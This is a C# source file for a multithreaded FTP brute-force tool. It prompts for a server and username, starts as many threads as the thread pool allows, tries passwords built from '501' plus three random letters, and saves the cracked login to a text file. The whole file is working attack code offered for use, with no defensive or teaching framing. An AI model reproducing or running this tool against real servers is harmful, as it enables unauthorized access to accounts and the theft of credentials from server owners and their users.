using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.Timers;
using System.Diagnostics;
using WebCamService;
using System.Linq.Expressions;

namespace BruteForceFTP
{
    public class FTPBrute
    {
        public static List<Thread> threadList = new List<Thread>();

        public static String srv;
        public static String usr;

        private static bool foundLogin = false;
        private static Random rand = new Random();
        private static int attempts = 1;

        static String Ftp_Srv()
        {
            Console.Write("Enter FTP Server: ");
            srv = Console.ReadLine();
            return srv;
        }

        static String Ftp_Usr()
        {
            Console.Write("Enter FTP Username: ");
            usr = Console.ReadLine();
            return usr;
        }

        static void PrepareBrute()
        {
            Ftp_Srv();
            Ftp_Usr();
            Console.WriteLine("");
        }

        protected int pwd_first(int start, int end)
        {
            int pwd_first;
            pwd_first = rand.Next(start, end + 1);
            return pwd_first;
        }


        protected String pwd_second(int length)
        {
            var chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[rand.Next(s.Length)]).ToArray());
        }

        public void Brute()
        {
            string credDetails = "";

            while (!foundLogin)
            {
                string pwd_num = pwd_first(501, 501).ToString();
                string pwd_chr = pwd_second(3).ToString();

                var pwd = pwd_num + pwd_chr;

                FtpClient ftp = new FtpClient(srv, usr, pwd);

                try
                {
                    ftp.Login();
                }
                catch (FtpClient.FtpException returncode)
                {
                    // Console.WriteLine(pwd);
                    switch (returncode.Message)
                    {
                        case "530":
                            attempts += 1;
                            Console.Write("\rAttempts: {0}", attempts);

                            break;
                        case "230":
                            Console.Write("\rSuccessfully acquired login details after {0} attempts, Saving [+]", attempts);

                            credDetails = "ftp://" + srv + "::" + usr + "::" + pwd;

                            foundLogin = true;
                            break;
                    }
                }
            }

            Console.WriteLine("\n");

            // Console.WriteLine("((" + Thread.CurrentThread.Name.ToString() + "))" + "((" + credDetails + "))");

            var path = (Directory.GetCurrentDirectory() + @"\" + usr + ".txt");

            File.WriteAllText(path, credDetails);

            Environment.Exit(1);
        }

        public class Threading : FTPBrute
        {
            public void createBruteThreads()
            {
                var tasks = new List<Task>();

                int workerThreadCount;
                int ioThreadCount;

                ThreadPool.GetMaxThreads(out workerThreadCount, out ioThreadCount);

                ThreadPool.SetMaxThreads(workerThreadCount, ioThreadCount);

                for(int i = 0; i < workerThreadCount; i++)
                {
                    Thread newThread = new Thread(new ThreadStart(Brute));

                    if(newThread.Name == null)
                    {
                        newThread.Name = "Thread-" + i;
                    }

                    newThread.Start();
                    threadList.Add(newThread);

                    Console.Write("\r" + i + "/" + workerThreadCount + " Threads started...");
                }
                Console.WriteLine("\n");
            }
        }


        static void Main()
        {
            Threading Threading = new Threading();

            PrepareBrute();
            
            Threading.createBruteThreads();
        }
    }
}